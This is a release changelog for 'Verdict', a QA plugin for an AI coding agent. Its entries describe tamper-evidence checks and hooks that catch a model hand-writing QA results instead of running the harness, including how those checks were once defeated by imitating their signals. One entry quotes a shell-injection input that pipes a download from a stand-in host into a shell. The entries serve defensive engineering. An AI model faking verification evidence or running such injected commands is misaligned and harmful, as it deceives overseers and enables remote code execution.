# Changelog

Plugin and `verdict-mcp` share one version line; `.claude-plugin/plugin.json` and
`pyproject.toml` are bumped together.

## 0.42.0 — 2026-08-30 · "the run history signs itself"

**`--require-harness` was defeated by imitation, not forgery** (`VERDICT-F-12`, filed by
Verdict auditing itself). Exit 6 rests on two durable signals, and both were satisfiable
by copying: `state_computed` checks that a key holds a dict, `report_rendered` checks for
a fixed footer string. Both sit in the committed `.qa/` artifacts a fabricating model
reads before it writes. Adding `"calibration": {}` and pasting the footer flipped a
hand-written state from exit 6 to exit 0.

**Each finalized run now signs the run history.** Every `runs.jsonl` row carries
`chain` = `sha256(previous chain + this row, canonical JSON)`, and `state.json` records
the same value in `last_run.chain`. The difference from a constant is that the value
depends on the row beneath it, so a link copied forward from the previous run does not
verify.

**The state is bound to the link, not just the history.** The first version of this
signed the history row only — and a laundered `state.json` left `runs.jsonl` untouched,
so the chain stayed intact and the attack still passed. Caught by running the attack
rather than by reasoning about it. The row is *derived* from the state, so re-deriving
it and checking that it still reproduces the recorded link catches an edit made after
signing. The four cases, exercised end-to-end against a signed copy of this repo's own
QA root:

| | before | after |
|---|---|---|
| honest signed run | 0 | **0** |
| launder the state in place, imitate both old signals | 0 | **6** |
| fabricate a run, copy the last link forward | 0 | **6** |
| project from before the chain existed | 0 | **0** — plus a note |

**Two deliberate limits, both stated rather than hidden.** A history with no links reads
`unchained`, not broken, so no existing installation starts failing its own gate — but
the gate now *says* the history is unsigned, because a project that cannot yet be
protected otherwise looks exactly like one that is. One `verdict-finalize` run signs it.
And once any row is signed, a later row that drops its link is a break rather than a
downgrade: without that ratchet a fabricator would simply omit what it cannot compute.

None of this makes fabrication impossible. A model that reimplements the chain correctly
can still hand-write a state — at which point it has done most of the work the harness
would have done. What changes is that the cheap version fails loudly.

Also here: the `repo`/`qa_root` fixtures moved to `tests/conftest.py`. Importing them by
name made every test signature a redefinition of an imported symbol — thirty lint errors
and a pattern that would have spread with each new test file.

## 0.41.0 — 2026-08-30 · "the gate can see it too"

0.40.0 taught the session banner that a verdict ages in commits. The banner only
misleads a reader. **The gate merges code**, and `get_verdict` over MCP is what the
documented CI loop calls to make that decision — so both were still blind to the
same thing, on the side where it costs the most.

- **`verdict-gate --max-commits-behind N`** — exit 5 when the tested commit is more
  than N behind `HEAD`, and exit 5 unconditionally when it is not in `HEAD`'s history
  at all. Opt-in, exactly like `--max-age-hours` and `--min-run-number`: existing
  pipelines do not start failing, and there is a test that says so.
- **Deliberately silent when the distance cannot be measured.** A shallow clone, an
  absent commit or an unresolvable repository is `unknown`, and `unknown` never fails
  the gate. A gate that goes red on a shallow clone is a gate people route around,
  which costs more than the check earns.
- **`get_verdict` now returns `code_drift`** alongside the verdict, so a caller
  deciding a merge is told the distance instead of assuming the answer still
  describes the code in hand.
- Exposed as `max-commits-behind` on the Action, and as an opt-in flag on
  `verdict-run`.

**`state.repo_for_root()`** makes the link the gate needed: a QA root back to the
repository it describes. Team mode is structural (`<repo>/.qa`); solo mode reads the
profile's `Repo-Path:` header. Written both ways in the wild — the first pattern
matched **none** of the six live roots on this machine, because the profiles the
agent generates use `**Repo-Path:** \`/path\`` and only a hand-written one used the
bare form. Measured across all of them rather than assumed.

**Why `--max-commits-behind` is opt-in on `verdict-run` and not on by default**, even
though the run gates its own output moments later: a profile's `Repo-Path` records the
*main* worktree — that is what keeps the project key stable across worktrees — so a
run executed inside a linked worktree writes a sha the main worktree's HEAD has never
seen. Defaulting it on would have turned a healthy nightly red. The caveat is recorded
next to the function rather than in a commit message.

One thing this release does **not** claim to have fixed. `code_drift` resolves a squash
merge that preserved the tested tree. When a branch gains further commits before being
squashed, the tree that was measured exists nowhere in the resulting history, and the
honest answer is `diverged` — the verdict really does describe code this branch does
not have. That is now pinned by a test rather than left to be rediscovered as a bug.
This repository's own committed state is in exactly that position, and the gate says so.

## 0.40.0 — 2026-08-30 · "a verdict ages in commits"

**A stored verdict goes stale two ways, and only one of them is a clock.** This
repository's own SessionStart banner opened a session announcing three open Major
findings. All three had been fixed and merged in the six commits since the state was
written — four hours earlier. Nothing was corrupt: only a run resolves findings. But
every consumer read the state as current, because the only staleness signal in the
product was a seven-day rule and the state had not aged. **The code had moved.**

- **`state.code_drift(repo, sha)`** measures that once, for every consumer:
  `current` · `behind N` · `diverged` · `unknown`. `unknown` is load-bearing rather
  than a fallback — a shallow clone, an absent commit or a non-repo is not an alarm,
  because one false "you are behind" teaches people to skip the line.
- **The session banner puts the qualification above what it qualifies**, so a reader
  meets *measured 6 commits ago — findings below may already be fixed* before the
  findings, not after them. `/verdict:status` gains the same rule beside its 7-day
  one; neither substitutes for the other.
- **A timestamp in the future rendered as `-26422d ago`.** Fabricated timestamps are a
  documented failure mode here, and a state that misreports when it was written is a
  state to distrust. It now says so, and suppresses the 7-day line rather than
  double-reporting. Surfaced by a test fixture, not by a user.

**Then Verdict ran on itself and found a Major defect in the feature above.**
`VERDICT-F-10`: ancestry is not content. A squash merge replaces a branch with a new
commit carrying the identical tree, so `git merge-base --is-ancestor` says *no* the
moment a PR lands — and `code_drift` called that `diverged`, i.e. *"this verdict
describes different code"* about code that is byte-identical. Every PR in this
repository is squash-merged and `.qa/state.json` is committed, so **it would have
fired on `main` immediately.** Reproduced before accepting it: same tree
`58b51987`, `git diff --stat` empty, `--is-ancestor` exit 1, verdict `diverged`.

The fix asks what a commit *contained* rather than where it sat — walk back for a
commit whose tree matches the one recorded, and the distance to it is the honest
answer; only when no commit carries that content is the code really different.
Squash-merged now reads `current`, squash-merged-then-two-commits reads `behind 2`,
genuinely different content still reads `diverged`. A non-`0`/`1` return from
`--is-ancestor` is an error, not an answer, and reads `unknown`.

Two things Verdict was right to insist on beyond the one line: the same modelling
error was **duplicated in prose** in `commands/status.md`, where a code-only fix
would have left the agent making the claim anyway; and both existing divergence
tests built divergence from content that genuinely differed, so there was no
negative case — which is how a proven false positive shipped inside 140 lines of
new tests. Both corrected.

**Also fixed, all filed by that same run:** the rename-desync guard matched the
command name with `startswith`, so `/specification` satisfied stem `spec`
(`VERDICT-F-16`); `action.yml` still documented its exit code as `0/1/3/4/5` after
gaining `6` (`VERDICT-F-14`); and the stale-command-name guard enumerated four
paths by hand, missing `README-pypi.md` — the page PyPI renders (`VERDICT-F-15`).
Widening that sweep immediately proved the *pattern* also needed tightening: it
matched any `/qa-` substring and flagged `.../worktrees/qa-nightly`, a directory
name. It now names the eleven commands that have ever existed and nothing else.

**The run itself:** run 3, delta over `062feed..0a9269a`, verdict `pass with risks`,
gate exit 0 under `--require-harness`. All four previously open findings closed
**fix-verified on demonstrated evidence** rather than on the claim that they were
fixed — F-5 by differential on the same tree at the same moment, F-6 by driving exit
6 through the real gate, F-8 by re-injecting the mutant, F-9 on the exact crash
input. `F-11` is also fixed here: the published sdist included `tests/` but not the
`eval/`, `hooks/` and `commands/` trees they import, so the distribution's own
suite could not run — collection error, 123 failures on a `git archive` build.
`tests/` is now absent rather than completed, because completing it costs ~1.1MB
against a 124KB archive to ship tests nobody downstream runs, and a suite that
cannot run is worse than no suite. Built and checked: 88KB, 17 entries, no test
tree and no session worktrees; the wheel is unchanged, installs clean, and all
six console scripts answer `--help` reporting 0.40.0.

Two findings remain open and are not addressed here: `F-12`
(`--require-harness` is defeated by imitation, not just forgery — both durable
signals are visible in the committed `.qa/` artifacts a fabricating model would
copy), and `F-13` (`fixture_freshness` reproduces the fixture lossily: mode
changes, symlink swaps and planted untracked files are invisible, and a missing
tracked file tracebacks).

`.qa/state.json` here records `F-10` as open: it is what run 3 measured at
`0a9269a`, and the fix came after. The banner this release adds is what now says so.

## 0.39.0 — 2026-08-30 · "ten commands"

**Breaking: every command is renamed, and two are gone.** Twelve commands become ten.

- **The `qa-` prefix is dropped from all nine.** Plugin commands have no short form — a
  bare `/verdict` is an unknown command, measured rather than assumed — so the name a
  user actually types was `/verdict:qa-status`, which says QA twice. The namespace
  already carries it. It is `/verdict:status` now, and `/verdict:baseline`,
  `/verdict:bug`, `/verdict:cause`, `/verdict:charter`, `/verdict:flake`,
  `/verdict:regression`, `/verdict:release`, `/verdict:spec`.
- **`/qa-delta` and `/qa-review` are removed**, not renamed. Both were the daily pass
  under two names, and `/verdict:run` — the front door added in 0.30.0 — already reads
  the stored state and picks baseline, delta, or a scoped review on its own. Keeping
  them meant three doors into one room, with the two older ones unable to do the
  routing. The front door is the only door.
- **No deprecation stubs.** The old names now answer `Unknown command`. This was checked
  rather than assumed to be safe: the nightly loop (`verdict-run`) and `action.yml` both
  drive **natural-language prompts, not slash commands**, so no scheduled or CI run
  invokes a removed name. `docs/nightly.md`, the README, the issue template and the
  demo SVG all recorded `/qa-review` or `/qa-delta` in copy-pasteable recipes; all are
  updated. Anyone with a personal script that types the old names must update it.

**The command set is now a checked contract** (`tests/test_commands.py`). The README's
command table drifting from `commands/` is not cosmetic — a documented command that
answers `Unknown command` reads as the plugin being broken — and this rename touched
twenty-odd references across nine files by hand, which is exactly the operation that
leaves one behind. The tests assert the table and the directory are the same set, that
every command carries the front matter that makes it selectable, that no command routes
to a sibling that is not shipped, and that no live doc still names a `/qa-` command.
Each was mutation-checked: reverting one table row, one cross-reference, and one command
file's front matter each turns the suite red.

**The eval harness can no longer desync on a rename.** `eval/run_eval.py` copies a
shipped command file into a scratch project and then invokes it by name, from two
independent fields — provision `qa-spec.md`, invoke `/qa-spec`. A rename that moved one
and not the other failed as a mystery *inside* the model run, where it looks like the
agent ignoring its instructions. The harness now checks the file exists and that the
prompt invokes the stem it was provisioned as, and exits with the mismatch named.

Historical CHANGELOG entries, the dated eval results table, and `eval/corpus/*/meta.json`
keep the names used at the time. They record what ran, not what is shipped.

## 0.38.0 — 2026-08-30 · "the last two findings from the self-review"

- **`VERDICT-F-5` — the tamper-evidence gate cried wolf.** `eval/fixtures/pricer-delta.diff`
  is the committed record of how rev-A differs from rev-B, regenerated and compared so
  fixture drift cannot silently change what the seeded eval measures. The comparison used
  `git diff --no-index`, which **does not honour `.gitignore`** — so running the fixture's
  own tests once produced `__pycache__/`, the regenerated diff grew, and the gate reported
  tampering of a file nobody had touched. Reproduced exactly: a 78-line anchor against an
  86-line regeneration, every extra line a build artifact. A tamper alarm that fires on
  `__pycache__` is one people learn to ignore, which is worse than not having one.

  `eval/fixture_freshness.py` compares **tracked files only**, copied to a scratch tree —
  `git ls-files` being the same definition of "the fixture" the repository already uses, so
  artifacts cannot enter and a real edit, staged or not, still shows. Verified in both
  directions: a two-line edit to `pricer.py` fails the gate, an untracked file does not.
  CI and the profile now call that one script, because a gate defined twice is how this
  repository has already drifted three times.

- **`VERDICT-F-8` — three tests that passed while measuring nothing.** In `test_mutate.py`
  the assertions lived *inside* `for mutant in generate(source)`, so a `generate()` that
  regressed to returning `[]` would leave all three green while the mutation engine
  produced no mutants — the tool that measures suite quality, its own suite measuring
  nothing. Emptiness is now asserted before the loop. Verified by neutering the operator
  set: `AssertionError: the operator set collapsed: 0 mutants`, where the old tests passed.

That closes every finding from the self re-baseline: F-1 through F-4 resolved by the
re-baseline itself, F-6 and F-9 in 0.36.0, F-5 and F-8 here.
## 0.37.0 — 2026-08-30 · "a name on PyPI, and what the sdist nearly took with it"

The MCP server becomes installable from PyPI. Preparing that release turned up two things
worth stating plainly.

- **The distribution is `verdict-qa-mcp`, not `verdict-mcp`.** That name was registered on
  PyPI on 2026-08-23 by an unrelated project in the same niche — an MCP server giving
  verification feedback to coding agents ([Dgotlieb/verdict-mcp](https://github.com/Dgotlieb/verdict-mcp),
  four alpha releases). Parallel invention, six days before our launch, and theirs was
  first. **Only the name PyPI indexes moved**: the console script is still `verdict-mcp`,
  the import package is still `verdict_mcp`, the plugin is still `verdict`. `__init__.py`
  moved with it — `version("verdict-qa-mcp")` — because the version lookup keys on the
  *distribution* name, and leaving it behind would have made every real install report
  itself as `0+unknown` down the `PackageNotFoundError` path.
- **The sdist was shipping 332 files of agent session worktrees.** hatchling honours
  `.gitignore` but not `.git/info/exclude`, which is where `.claude/worktrees/` is excluded
  — so a default build swept in full duplicate copies of this repo, eval fixtures and all,
  at 937 KB. Now an anchored allowlist: 32 entries, 124 KB. The anchoring is the load-bearing
  part — these are gitignore-style globs, so an unanchored `README.md` matched at *any*
  depth and pulled the worktree copies straight back in through the allowlist that was
  supposed to stop them. No secrets were in the archive; it was bloat, not a leak. Caught
  before the first upload, which is the only time it can be caught — a PyPI version number
  can never be reused.
- **Published by Trusted Publishing**, tag-triggered, tests re-run in the release job before
  anything is built. There is no PyPI token in this repository and none on the maintainer's
  machine: a leaked token is the usual way a small package gets hijacked, and the safest
  token is the one that does not exist.
- **`README-pypi.md`** — the plugin README is written for GitHub and a dozen of its links
  are relative to the repo, which resolve to nothing on a PyPI page. The distribution now
  ships its own front page describing the server and the CLIs it actually installs.

## 0.36.0 — 2026-08-30 · "two findings the tool made about itself"

Yesterday's re-baseline reviewed this repository and filed nine findings. These are the two
that mattered, both defects introduced by this project's own last two days of work.

- **`VERDICT-F-6` — the anti-fabrication check was unreachable from CI.** `--require-harness`
  shipped in 0.22.0, was wired into `verdict-run` and into `/verdict:run`, had tests for
  exit 6 — and `action.yml` exposed no input for it, so no workflow could ask, including
  this repository's own `qa-gate.yml`. A guard nobody can invoke is the failure the Stop
  hook was built to fix, reappearing one layer up. The Action takes `require-harness` now,
  and the self-gate turns it on.

  Plumbing it naively would have been wrong in the deployment it exists for. A team-mode
  `.qa/` gitignores `facts.json` and `judgment.json` — per-run scratch — so a fresh CI
  checkout finds neither, however honestly the run was measured. The gate now decides on
  the **durable** traces: `calibration`, written only by `merge`, and the report footer,
  emitted only by the renderer. Those survive a checkout, and they are the stronger
  evidence anyway — `facts.json` existing proves the measuring step ran, not that
  `finalize` consumed it. The other two are reported and no longer required. Verified
  against this repo's own committed state, which the naive version would have refused.

- **`VERDICT-F-9` — `verdict-finalize` crashed on a string `prose`.** `render_report`
  called `.get` on it and raised a bare `AttributeError`; the intake validator added in
  0.27.0 — built precisely to explain judgment errors in the author's own terms — never
  checked the field. Fixed at both boundaries: `validate_judgment` now names the expected
  shape and says a bare string crashed the renderer, and the renderer treats any
  non-object prose as empty, because losing a whole run to a typo is worse than losing a
  narrative section.

`VERDICT-F-5` (the freshness gate is not hermetic) and `VERDICT-F-8` (vacuous loop tests)
remain open, aged, and carried.

## 0.35.0 — 2026-08-30 · "the tool stops shipping a stale verdict of itself"

The committed `.qa/` was a v0.12-era snapshot, and it was not merely untidy — the self-gate
was **publishing** it, posting `VERDICT-F-1 | Major/P1 | 0d | Scope guards use abspath not
realpath` onto every pull request. That finding shipped fixed in v0.12.1. So did the other
three: `VERDICT-F-2` said `.qa/` was untracked, which stopped being true when someone
tracked it; F-4 was already resolved.

- **Re-baselined against the current tree**, through the harness, at v0.34.0. All four old
  findings are recorded `RESOLVED` on evidence rather than deleted — the delta memory is
  the point. Nine findings tracked, verdict `pass with risks`.
- **`verdict-validate --at-rest`** checks a state as a *file* rather than as a run that
  just happened: it drops the "over a day old" rule and nothing else. The two are different
  questions. Freshness belongs to a run; a committed state is stale by tomorrow morning by
  construction, and a CI job asking whether the team's checked-in baseline is well-formed
  should not be told no for the crime of being a week old. A timestamp in the *future*
  stays a violation either way — that is broken, not old.
- **CI validates the committed state at rest** before serving it as a verdict, so this
  cannot silently rot again. The reason is written into the workflow.
- **`.qa/.gitignore`** separates the shared record from per-run scratch: `state.json`, the
  reports, `runs.jsonl`, `outcomes.json` and the profile are the team's baseline and belong
  in git; `facts.json`, `judgment.json` and `state.json.prev` describe one machine's
  execution and do not.

**What the re-baseline found — four open, all `confidence: proven`, and three of them are
defects in this project's own last two days of work:**

- `VERDICT-F-5` (Major) — `fixture_freshness`, the tamper-evidence gate, false-fails: it
  uses `git diff --no-index`, which ignores `.gitignore`, so the gate is not hermetic.
- `VERDICT-F-6` (Major) — the GitHub Action exposes no `require-harness` input, so the
  exit-6 check added in 0.22.0 is **unreachable from CI**. The guard exists and CI cannot
  ask for it.
- `VERDICT-F-9` (Major) — `verdict-finalize` crashes with a raw `AttributeError` when
  `judgment.prose` is a string, and the intake validator added in 0.27.0 never checks that
  field. The check built to explain judgment errors has a hole shaped exactly like one.
- `VERDICT-F-8` (Minor) — three tests in `test_mutate.py` assert only inside a
  `for mutant in …` loop, so they pass vacuously if the list is ever empty.

## 0.34.0 — 2026-08-30 · "the implementer gets the memory too"

- **A `SessionStart` hook puts the tester's findings in front of the next session.** The
  asymmetry it fixes was measured, not imagined: Verdict filed eleven evidenced findings on
  a live site — one a release blocker reading *deploying this branch strips every
  production security header* — and the very next session in that repository did a full SEO
  pass and touched none of them. Not the blocker, not the application form that reports
  success when its handoff failed, not the WCAG failures on both primary CTAs. The findings
  were in `state.json` the whole time. `next_run_focus` existed but only Verdict reads it;
  `get_findings` existed over MCP but nothing called it unprompted.
- **Verified as a hook, not as a function.** In a scratch session with a planted finding,
  the model answered "is there outstanding QA work here?" by naming `ZEBRA-F-42` —
  *"according to the startup status"* — without running a single command.
- **Built to be read.** It leads with release blockers, then open counts by severity and the
  oldest age, then the top findings that were not already named as blockers, then the
  next-run focus. Memory older than a week is flagged rather than served as current, a
  clean project gets one line, and the closing line says these are findings, not
  instructions — the hook informs a session, it does not commandeer one. Silent in a repo
  with no QA state and on every failure path.

## 0.33.1 — 2026-08-30

- **`${CLAUDE_PLUGIN_ROOT}` is text, not an environment variable — now said so.** Claude
  Code substitutes the token when it *loads* the agent and command files, so the path an
  agent reads there is real; but `$CLAUDE_PLUGIN_ROOT` in a Bash call expands to nothing,
  turning `ls $CLAUDE_PLUGIN_ROOT/src` into `ls /src`. Measured directly
  (`ROOT=[UNSET]`), after a live run on a real project logged one failed command —
  "Failed to inspect verdict plugin layout" — and recovered on the next step. §0 now
  states it where the agent first meets the token, and the two places that hand a command
  line to a shell (§6's harness invocation, `/verdict:run`'s self-gate) say
  `<plugin-root>` with the resolved path rather than the literal token.

## 0.33.0 — 2026-08-30 · "the guard that does not need remembering"

- **A `Stop` / `SubagentStop` hook enforces the harness.** Every other check in this system
  sits downstream of a tool the model must choose to call, and yesterday a run of
  `/verdict:run` demonstrated the gap: it wrote to the default state root while
  `$VERDICT_HOME` pointed elsewhere, invented a project key, skipped `verdict-facts` and
  `verdict-finalize` entirely, and produced a confident `FAIL`. Both guards that would have
  caught it stayed silent because nothing invoked them. The hook fires on the turn ending
  instead: if a QA run just left hand-written state on disk, it blocks the stop once and
  says what to redo.
- **It is built to stay quiet.** Four conditions must all hold before it speaks — not
  already continuing because of this hook (never loop), a QA root resolves from the
  session's cwd, `state.json` was written within the last half hour, and the harness traces
  are missing. Otherwise it exits in about two stat calls: **37 ms measured**, at the end
  of a turn. Bad JSON, a failed import, an unreadable state — all exit 0 silently, because
  a hook that bricks sessions is worse than the problem it polices.
- **Proven as a hook, not just as a function.** Nine unit tests, seven of them about
  silence; then a live session with hand-written state planted, where the hook intercepted
  the stop and the model came back with "verdict QA state must flow through the proper
  harness workflow… never written directly."
- **And the first version was wrong, caught by this repo's own CI.** It judged recency by
  the state file's *mtime*, and `git checkout` stamps every file with the current time —
  so on a fresh CI checkout the hook fired on Verdict's own committed team-mode `.qa/`.
  mtime is not evidence that a run happened; copying a file is not running one. Recency
  now comes from the `last_run.timestamp_utc` the run itself recorded, which a copy cannot
  forge. The same fix removed an `os.getcwd()` fallback for an event with no `cwd`: not
  knowing where you are is a reason to stay silent, not a reason to look somewhere else.
  Both cases are now permanent tests.

## 0.32.0 — 2026-08-30 · "gate your own run"

- **`/verdict:run` now gates itself.** Before the handoff it runs
  `verdict-gate --require-harness --min-run-number <n>` against what it just wrote, and
  reports the exit code and reason verbatim as the first line of the handoff. The command
  spells out what each code means and forbids explaining a 6 away.
- **Why, measured rather than asserted.** A haiku-model run of this command wrote to the
  default state root while `$VERDICT_HOME` pointed elsewhere, invented a project key
  (`frontdoor-repo` where the mechanical rule gives `repo`), skipped the harness entirely
  (no `facts.json`, no `calibration` block), used a finding id outside the required
  format, and typed `schema_version` as a string — while producing a confident,
  plausible-looking `FAIL` that found the seeded defect correctly. A separate probe
  confirmed `$VERDICT_HOME` *did* reach the session's Bash tool, so the variable was
  ignored, not lost.

  Every one of those violations has a guard already built. **None fired, because nothing
  invoked them.** The enforcement in this system is downstream of a tool the model must
  choose to call, and `verdict-run` closes that for scheduled runs by gating from outside;
  the interactive path had nothing. This step is what invokes them.

  It remains a prompt rule, and prompt rules are exactly what that haiku run ignored — so
  it is a real improvement for a capable model and an honest partial fix, not a guarantee.
  The guarantee wants a stop-hook that fires whether or not the model remembers.

## 0.31.0 — 2026-08-30 · "/verdict:run"

- **The front door is `/verdict:run`**, renamed from the `/verdict:verdict` that 0.30.0
  shipped hours earlier. Plugin commands are namespaced and must be typed in full, so the
  file name is the second half of what a user types — `verdict.md` stuttered.
- **The short-form claim in the README was wrong, and is now measured.** 0.30.0 said a
  client "may accept the short form" where the name is unambiguous. Tested headlessly
  against the installed plugin: `/verdict` returns `Unknown command`, while
  `/verdict:qa-status` resolves and runs. There is no short form; the README says so.

## 0.30.0 — 2026-08-30 · "a front door"

- **`/verdict`** — the command a newcomer types. Ten commands each owned a specific job
  and none owned "just run it", so the entry point was knowledge you had to already have:
  baseline first, then delta, unless a re-baseline trigger tripped. That is routing the
  state can do itself. `/verdict` resolves the QA root, reads `state.json`, and picks the
  pass — baseline when there is no history, today's delta when there is, a narrowed delta
  when you name a target — **and says which it chose and why** rather than silently
  deciding. Narrowing scope stays legitimate; narrowing the artifact does not, and
  everything outside the narrowed scope lands in `not_tested`.

## 0.29.0 — 2026-08-30 · "the record and the runner"

Two architecture items from the external review, both about closing loops the design
already implied.

- **`runs.jsonl` — history gets a machine-native store.** The run-over-run time series
  lived only in INDEX.md, and consumers parsed the markdown table with heuristic column
  matching. Production defeated that months ago: run-type cells carry prose like "delta
  (merge gate re-gate: … @ 5b9518d1)", and every reader had to un-parse a rendering. One
  JSON line per finalized run now — number, type, verdict, timestamp, SHAs, test counts,
  open-by-severity, delta counts, report. `get_history`/`get_trends` read it first and
  fall back to the INDEX parse only for history predating the file; the INDEX stays, as a
  render for humans. Readers skip a torn trailing line and keep the last line per
  run_number.
- **`verdict-run` — the nightly script, shipped.** Every adopter so far re-invented the
  same runner, and each copy re-learned the same three lessons: a headless session can
  end its turn without writing state (exit 0, a lost night that looks like success); a
  session-limit error names its reset time; a dead run must not re-serve yesterday's
  verdict. `verdict-run` is those lessons — records the run_number the run must beat,
  retries once on each failure mode, gates with `--min-run-number` and `--require-harness`
  armed by default, and exits with the gate's code. Everything after a bare `--` passes to
  the `claude` CLI verbatim.
- **The model that signed the verdict is measured, not remembered.** `verdict-run` exports
  `VERDICT_MODEL`; `verdict-facts` lands it in `last_run.model` and the history row.
  Which model is verdict-trusted used to live in the operator's memory; now a consumer
  reading the state can see which judge signed it.

## 0.28.0 — 2026-08-29 · "the species you are actually facing"

Most code Verdict reviews from here on was written by a model, and models fail with a
signature: the surface is *more* polished than human code while the defects sit
underneath, where polish stops a reader from looking. Built the full way — measured,
catalogued, and evaluated — never as prompt lore.

- **`docs/ai-authored-code.md`** — ten patterns, each a procedure with a trigger, a check
  and an evidence bar, and where possible the real incident that earned it from this
  project's own audited history: declared-but-never-wired (the `STATUSES` enum),
  convergent duplication that drifts (the REGRESSED-first sort), fix-the-instance-miss-
  the-class (AJT-F-14), self-satisfying tests (AJT-F-13, the liar fixture), hallucinated
  surface, silent swallows, placeholder erosion, Chesterton demolition, context-window
  seams, confident-comment-different-code. Plus a reading order under budget: deletions
  first, because absence is the one defect nothing else ever looks at.
- **`code_census` in facts.json** — the mechanically countable signatures, measured by
  `verdict-facts` rather than left for the model to notice: import roots matching no
  declared dependency, no stdlib module and no local module (the hallucinated-dependency
  check, which is also the slopsquatting check); TODO/"for now"/stub markers and swallowed
  exceptions (`except: pass` as adjacent lines, empty `catch {}` in both block and arrow
  form); AI-attribution of the range from commit trailers, with the stated caveat that
  absence of trailers proves nothing. Diff-scoped on delta runs, a capped tree scan on
  baselines, and every census names its own scope. A census is a **lead, never a finding**.
- **§4.5 in the agent prompt** wires it in: provenance is a §8.2 risk-prior input like
  change volume, never a conviction; the five §3 classes stand — these are finding
  sources, not a sixth classification; and the §9 confidence discipline applies unchanged,
  so the calibration table will say whether the catalog sharpens the tester or makes it
  cry wolf.
- **`eval/fixtures/slop/`** — the scored fixture, with real git history: a polished,
  green, plausibly-generated module whose defects are exactly the catalog's species. The
  "simplify" commit deletes the rule-4 guard; the "full coverage" commit deletes the test
  that guarded it; the suite passes and every defect must be found by reading. Two of
  three commits carry AI trailers so the provenance census fires. Eight-row answer key.
- The profile front matter gains `authorship:`, recorded into the census as a declaration
  alongside the measured trailer count.

## 0.27.0 — 2026-08-29 · "checked where the author stands"

`verdict-finalize` validated only the merged state. That is the right place to stop a bad
state reaching disk and the wrong place to *explain* one: the agent's mistake arrived
translated into the vocabulary of a structure it never wrote. A reworded evidence line
surfaced as `repeats id` — true, and useless.

- **`judgment.json` is now checked at its own boundary**, before the merge, and nothing is
  written when it fails. The messages name the finding index, its id, the field and what
  belongs there: a finding not present in the previous state is told it will be filed
  `NEW` and must state its confidence *now* (knowable before the merge, not after); two
  findings under one id are told to mint a second; an open finding without evidence is a
  hypothesis; a `pass` over an open Critical is §10.
- **Fields the harness computes are called out rather than silently overwritten.** A
  judgment that sets `hash`, `first_seen`, `age_days`, `outcome` or `carried_forward` is
  told so — judgment.json carries judgment, and saying which fields are not judgment
  teaches the contract better than a rule nobody reads.

## 0.26.0 — 2026-08-29 · "the profile runs the gates"

The last transcription step in the pipeline is gone.

`profile.md` has always recorded a project's real commands, and the agent has always had to
*retype* them into `verdict-facts --gate suite='…'` on every run. That is a model sitting
between the configuration and the measurement, which is the exact arrangement the rest of
this architecture exists to delete — and it was already failing in production: the sales
profile grew a "Real commands" section precisely because the retyping kept going wrong.

- **A front-matter block at the top of `profile.md`** names the gates, the test-id command
  and the coverage command. `verdict-facts` reads it, so the canonical invocation is now
  `verdict-facts --repo . --qa-root <root>` with no flags at all. Explicit `--gate` still
  wins for narrowing a run, and the override is recorded in the facts.
- **A deliberately small subset of YAML, not YAML.** `key: value` at the left margin, one
  level of two-space-indented `name: value` under a bare `key:`. Values run to end of line
  and are taken literally, because commands are full of colons, quotes and pipes and a
  cleverer parser would mangle them. Stdlib only — the harness still runs bare.
- **A line it cannot read is an error naming that line**, never a skip. Silently dropping a
  gate would reintroduce the failure the block exists to remove, and a run that measured
  nothing looks exactly like a run with nothing to measure. For the same reason, keys the
  harness does not read are reported rather than discarded, and a run that ends up with no
  gates at all records `no_gates` and says every count and duration gate is unmeasurable.
- `/qa-baseline` writes the block first, and is told to omit a key rather than guess at it:
  a wrong command measures the wrong thing silently, a missing one is reported.

## 0.25.0 — 2026-08-29 · "one spelling of everything"

A refactor review of the whole tree. Most of it said *leave this alone*, correctly. What it
found that mattered was duplication — and in two places the duplicates had already drifted.

- **The report and the gate disagreed about finding order.** `harness` carried its own copy
  of the REGRESSED-first sort, and the copies were not identical: `order_findings` strips
  whitespace before ranking a severity and the harness copy did not, so a severity written
  ` Critical ` sorted below `Major` in the report and above it in the gate, the MCP surface
  and the PR comment. One function now.
- **The outcome ledger was folded twice, from two different dates** — `merge` used the run
  date, `write_state` re-derived it from the run timestamp — so across a UTC-midnight run
  the calibration block inside the state could disagree with the ledger persisted beside
  it. Folded once and carried, and the private key it travels on is taken off before
  anything serialises the state.
- **Every state write is now atomic** — temp file plus `os.replace`, for `state.json`, its
  `.prev` snapshot, `outcomes.json` and the INDEX row. A crash mid-write left the file the
  whole system pivots on half-written; §6 already carried a rule for recovering from a
  corrupt state, and it is cheaper to make that near-impossible than to handle it well.
- **`__version__` said 0.2.0** while `plugin.json` and `pyproject.toml` said 0.24.0 — a
  third place to remember at release time is a third place to forget. It reads the
  installed distribution now.
- One spelling of the `VERDICT_HOME` default in importable code; the hooks keep their own
  copy on purpose, because a PostToolUse hook that can raise `ImportError` is worse than a
  duplicated line.
- **Lint config committed and wired into CI** — pyflakes, syntax errors, complexity and
  ambiguous names. Deliberately not `ruff format`: the narrative comment layout is a house
  idiom and reformatting it would churn every file for nothing. Cleared what it found:
  seven unused imports, five ambiguous `l` variables.
- Docs: `git_sha_previous` and `gates.<name>.blocking` appeared in the schema example and
  have never been written by the harness.

## 0.24.0 — 2026-08-29 · "not just Python, measurably"

Remaining items from the external audit, in value order.

- **Runner dialects.** The count parser only ever spoke pytest, so for Go, Ruby, PHP, .NET
  and JVM projects the counts came back empty — and *silently*, which meant two of the
  things Verdict does that a plain test run does not (the "a silent drop in test count is a
  finding" gate, and the test-id set-diff) simply never fired there. Now twelve dialects,
  each selected by a signature phrase rather than by ordering, because the vocabularies
  overlap: `1 failure` is both gotestsum and rspec, `Failures: 1` is both surefire and
  phpunit, `5 passed` is pytest, cargo, jest and vitest. Read by the wrong dialect the
  numbers are not so much wrong as incomplete — cargo read as pytest silently drops
  `ignored`, which is the skip count the gate cares about. Plain `go test` prints no totals
  at all and is tallied from its `--- PASS:` lines.
- **Unparsed is now said out loud.** A gate whose summary matched nothing records
  `counts_unparsed` instead of quietly omitting counts: "the suite reported nothing" and
  "we failed to understand the suite" are different problems with different fixes. Where a
  runner reports its own total, that total wins over our arithmetic over its parts — they
  disagree when a test errors during collection.
- **`action.yml` no longer splices inputs into shell.** `run-prompt`, `project`, `fail-on`,
  `findings`, `max-age-hours`, `min-run-number` and `claude-version` now arrive through
  `env:`. Quoting a `${{ }}` interpolation does not help: the substitution happens before
  bash parses the line, so an input like `"; curl evil | sh; #` executes. Inputs are
  workflow-author controlled, but one person wiring `run-prompt` to a PR title turns that
  into remote code execution.
